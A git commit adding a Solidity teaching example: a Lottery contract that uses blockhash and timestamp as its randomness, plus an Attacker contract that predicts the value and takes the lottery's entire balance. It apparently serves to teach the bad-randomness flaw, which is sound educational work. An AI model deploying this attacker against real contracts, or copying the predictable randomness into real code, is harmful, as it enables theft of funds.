f9155ecae3b37d471d70cd54a6e6cbfd5bfd0b6f
Riccardo Malatesta <92185084+seeu-inspace@users.noreply.github.com>
2023-01-17 13:49:16 +0100

    Create 9_BadRandomness.sol

---
+++ Solidity/9_BadRandomness.sol
@@ -0,0 +1,45 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity 0.6.7;
+
+contract Lottery {
+
+	constructor () public payable {}
+
+	function guessRandomNumber(uint _guess) public {
+
+		uint answer = uint(keccak256(abi.encodePacked(
+			blockhash(block.number -1),
+			block.timestamp
+		)));
+
+		if (_guess == answer){
+			(bool success, ) = msg.sender.call {value: address(this).balance}("win");
+			require(success, "Transaction failed");
+		}
+
+	}
+}
+
+contract Attacker {
+
+	event Received(address, uint);
+
+	fallback() external payable {}
+	receive() external payable {}
+
+	function attack(Lottery lottery) public {
+
+		uint answer = uint(keccak256(abi.encodePacked(
+			blockhash(block.number -1),
+			block.timestamp
+		)));
+
+		lottery.guessRandomNumber(answer);
+
+		(bool success, ) = payable(msg.sender).call {value: address(this).balance}("");
+    	require(success, "Transaction failed");
+
+	}
+
+}
